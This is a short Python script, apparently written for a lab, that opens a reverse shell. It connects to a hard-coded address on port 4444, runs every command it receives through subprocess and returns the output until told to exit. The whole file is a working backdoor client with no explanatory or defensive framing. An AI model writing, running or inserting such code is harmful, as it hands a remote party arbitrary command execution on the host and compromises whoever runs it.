import socket
import subprocess
import os

SERVER_IP = '192.168.226.136'
SERVER_PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((SERVER_IP, SERVER_PORT))

while True:
    command = s.recv(1024).decode('utf-8')
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode('utf-8'))

s.close()
